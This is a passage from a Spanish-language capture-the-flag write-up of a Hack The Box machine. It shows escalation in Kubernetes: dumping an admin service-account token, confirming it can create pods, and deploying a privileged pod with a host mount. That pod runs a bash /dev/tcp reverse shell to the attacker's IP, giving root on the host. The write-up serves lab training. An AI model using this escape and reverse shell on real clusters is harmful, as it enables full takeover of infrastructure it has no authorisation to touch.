</span></span><span class=line><span class=cl>replication-controller-token-9m8mh                   kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>service-account-controller-token-6vsl2               kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>node-controller-token-dfztj                          kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>metrics-server-token-d4k84                           kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>pvc-protection-controller-token-btkqg                kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>pv-protection-controller-token-k8gq8                 kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>endpoint-controller-token-zd5b9                      kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>disruption-controller-token-cnqj8                    kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>cronjob-controller-token-csxvj                       kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>endpointslice-controller-token-wrnvm                 kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>pod-garbage-collector-token-56dzk                    kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>namespace-controller-token-g8jmq                     kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>daemon-set-controller-token-b68xx                    kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>replicaset-controller-token-7fkxv                    kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>job-controller-token-xctqc                           kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>ttl-controller-token-rsshv                           kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>deployment-controller-token-npk6k                    kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>attachdetach-controller-token-xvj9h                  kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>endpointslicemirroring-controller-token-b5r69        kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>resourcequota-controller-token-8pp4p                 kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>generic-garbage-collector-token-5nkzj                kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>persistent-volume-binder-token-865v2                 kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>expand-controller-token-f2csp                        kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>clusterrole-aggregation-controller-token-wp8k6       kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>default-token-h5tf2                                  kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>c-admin-token-b47f7                                  kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>k3s-serving                                          kubernetes.io/tls                     <span class=m>2</span>      235d
</span></span></code></pre></div><p>Entre todos los secretos, llama la atenciÃ³n el <code>c-admin-token-b47f7</code>. Para ver su contenido usamos el siguiente comando</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@devnode-deployment-776dbcf7d6-g4659:/usr/src/app# ./kubectl describe secrets/c-admin-token-b47f7 -n kube-system
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Name:         c-admin-token-b47f7stem659:/usr/src/app# ./kubectl2 describe secret
</span></span><span class=line><span class=cl>Namespace:    kube-system
</span></span><span class=line><span class=cl>Labels:       &lt;none&gt;
</span></span><span class=line><span class=cl>Annotations:  kubernetes.io/service-account.name: c-admin
</span></span><span class=line><span class=cl>              kubernetes.io/service-account.uid: 31778d17-908d-4ec3-9058-1e523180b14c
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Type:  kubernetes.io/service-account-token
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>Data</span>
</span></span><span class=line><span class=cl><span class=o>====</span>
</span></span><span class=line><span class=cl>namespace:  <span class=m>11</span> bytes
</span></span><span class=line><span class=cl>token:      eyJhbGciOiJSUzI1NiIsImtpZCI6InRqSFZ0OThnZENVcDh4SXltTGhfU0hEX3A2UXBhMG03X2pxUVYtMHlrY2cifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLWI0N2Y3Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIzMTc3OGQxNy05MDhkLTRlYzMtOTA1OC0xZTUyMzE4MGIxNGMiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.fka_UUceIJAo3xmFl8RXncWEsZC3WUROw5x6dmgQh_81eam1xyxq_ilIz6Cj6H7v5BjcgIiwsWU9u13veY6dFErOsf1I10nADqZD66VQ24I6TLqFasTpnRHG_ezWK8UuXrZcHBu4Hrih4LAa2rpORm8xRAuNVEmibYNGhj_PNeZ6EWQJw7n87lir2lYcqGEY11kXBRSilRU1gNhWbnKoKReG_OThiS5cCo2ds8KDX6BZwxEpfW4A7fKC-SdLYQq6_i2EzkVoBg8Vk2MlcGhN-0_uerr6rPbSi9faQNoKOZBYYfVHGGM3QDCAk3Du-YtByloBCfTw8XylG9EuTgtgZA
</span></span><span class=line><span class=cl>ca.crt:     <span class=m>570</span> bytes
</span></span></code></pre></div><p>Ya tenemos el token, este token lo guardaremos dentro del archivo token. Ahora probamos si tenemos permisos elevados con este token. Empezamos comprobando si podemos crear pods con este token</p><pre tabindex=0><code>./kubectl auth --token $(cat token) can-i create pod
yes
</code></pre><p>Efectivamente podemos.</p><p>En esta pÃ¡gina encontramos como escapar del contendor con este privilegio: https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/abusing-roles-clusterroles-in-kubernetes</p><p>Vamos a crear un pod, para ello primero creamos el siguiente yaml</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-yml data-lang=yml><span class=line><span class=cl><span class=l>root@devnode-deployment-776dbcf7d6-g4659:/usr/src/app# cat mount_root.yaml </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>apiVersion</span><span class=p>:</span><span class=w> </span><span class=l>v1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>kind</span><span class=p>:</span><span class=w> </span><span class=l>Pod</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>metadata</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>name</span><span class=p>:</span><span class=w> </span><span class=l>pwned2</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>labels</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>app</span><span class=p>:</span><span class=w> </span><span class=l>pentest</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>spec</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>hostNetwork</span><span class=p>:</span><span class=w> </span><span class=kc>true</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>hostPID</span><span class=p>:</span><span class=w> </span><span class=kc>true</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>hostIPC</span><span class=p>:</span><span class=w> </span><span class=kc>true</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>containers</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span>- <span class=nt>name</span><span class=p>:</span><span class=w> </span><span class=l>pwned</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>image</span><span class=p>:</span><span class=w> </span><span class=l>localhost:5000/node_server</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>securityContext</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>privileged</span><span class=p>:</span><span class=w> </span><span class=kc>true</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>volumeMounts</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>- <span class=nt>mountPath</span><span class=p>:</span><span class=w> </span><span class=l>/root/</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>name</span><span class=p>:</span><span class=w> </span><span class=l>getflag</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>command</span><span class=p>:</span><span class=w> </span><span class=p>[</span><span class=w> </span><span class=s2>&#34;/bin/bash&#34;</span><span class=w> </span><span class=p>]</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>args</span><span class=p>:</span><span class=w> </span><span class=p>[</span><span class=w> </span><span class=s2>&#34;-c&#34;</span><span class=p>,</span><span class=w> </span><span class=s2>&#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.47/4434 0&gt;&amp;1;&#34;</span><span class=w> </span><span class=p>]</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=c>#nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>volumes</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span>- <span class=nt>name</span><span class=p>:</span><span class=w> </span><span class=l>getflag</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>hostPath</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>path</span><span class=p>:</span><span class=w> </span><span class=l>/root/</span><span class=w>
</span></span></span></code></pre></div><p>Esto lo que va a hacer es que cuando creemos el pod con este yaml se ejecute desde la mÃ¡quina host el comando que especificamos en <code>command:</code></p><p>Como image ponemos localhost:5000/node_server, ya que al ser hackthebox la mÃ¡quina no tiene acceso a internet y no podemos poner un ubuntu. localhost:5000 es la imagen que se usa para los demÃ¡s pods, esto lo vimos cuando hicimos un describe del pod</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=nt>Image</span><span class=p>:</span><span class=w>          </span><span class=l>localhost:5000/node_server</span><span class=w>
</span></span></span></code></pre></div><p>Nos ponemos en escucha</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -nlvp <span class=m>4434</span>
</span></span></code></pre></div><p>Creamos el pod</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>./kubectl --token <span class=k>$(</span>cat token<span class=k>)</span> create -f mount_root.yaml
</span></span></code></pre></div><p>Recibimos la shell!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -nlvp <span class=m>4434</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>4434</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.47<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.235<span class=o>]</span> <span class=m>45130</span>
</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>171718<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
</span></span><span class=line><span class=cl>bash: no job control in this shell
</span></span><span class=line><span class=cl>root@unobtainium:/usr/src/app#
</span></span></code></pre></div><p>Ya estamos en la mÃ¡quina host como root</p><p>MÃ¡quina completada</p><div class="page-footer-meta d-flex flex-column flex-md-row justify-content-between"></div><div class="page-nav d-flex flex-column flex-sm-row"><div class="card w-100"><div class="card-body d-flex"><div class="d-flex flex-column justify-content-center"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-left" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12h14"/><path d="M5 12l6 6"/><path d="M5 12l6-6"/></svg></div><div class="d-flex flex-column"><div class=text-body-secondary>Prev</div><a href=/writeups/tryhackme/cyberlens/ class="stretched-link text-reset text-decoration-none">Cyberlens</a></div></div></div><div class=m-2></div><div class="card text-end w-100"><div class="card-body d-flex justify-content-end"><div class="d-flex flex-column"><div class=text-body-secondary>Next</div><a href=/writeups/hackthebox/ready/ class="stretched-link text-reset text-decoration-none">Ready</a></div><div class="d-flex flex-column justify-content-center"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-right" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12h14"/><path d="M13 18l6-6"/><path d="M13 6l6 6"/></svg></div></div></div></div></main></div></div></div><footer class="footer text-muted"><div class=container-lg><div class=row><div class="col-lg-8 text-center text-lg-start"><ul class=list-inline><li class=list-inline-item><a class=text-muted href=/tags/>Tags</a></li></ul></div><div class="col-lg-8 text-center text-lg-end"><ul class=list-inline><li class=list-inline-item>Brought to you by <a class=text-muted href=https://gethyas.com/>Hyas</a></li></ul></div></div></div></footer><script async src=/js/app.1e84dcdaa5ccef6fe83f6d88ac1e444a1f237111cfa2a7a97427f758e9c27ef4.js integrity="sha256-HoTc2qXM72/oP22IrB5ESh8jcRHPoqepdCf3WOnCfvQ="></script><script async src=/js/flexsearch.78e4b7a9456a2770bd6faffb1f6488b30db12ca157c3df4e89e3ae2e258888ae.js integrity="sha256-eOS3qUVqJ3C9b6/7H2SIsw2xLKFXw99OieOuLiWIiK4="></script><script async src=/js/search-modal.c4c023efcdee308e4b5f1110afe1db6b1656f217e67aa7efe54e2f4bf2feccf8.js integrity="sha256-xMAj783uMI5LXxEQr+HbaxZW8hfmeqfv5U4vS/L+zPg="></script><div class="d-inline-flex fixed-bottom-right pb-4 pe-4"><button id=toTop type=button class="btn btn-primary rounded-circle ms-auto p-2"><span class=visually-hidden>Top</span><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-up" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 15l6-6 6 6"/></svg></button></div><script src=/js/main.js></script></body></html>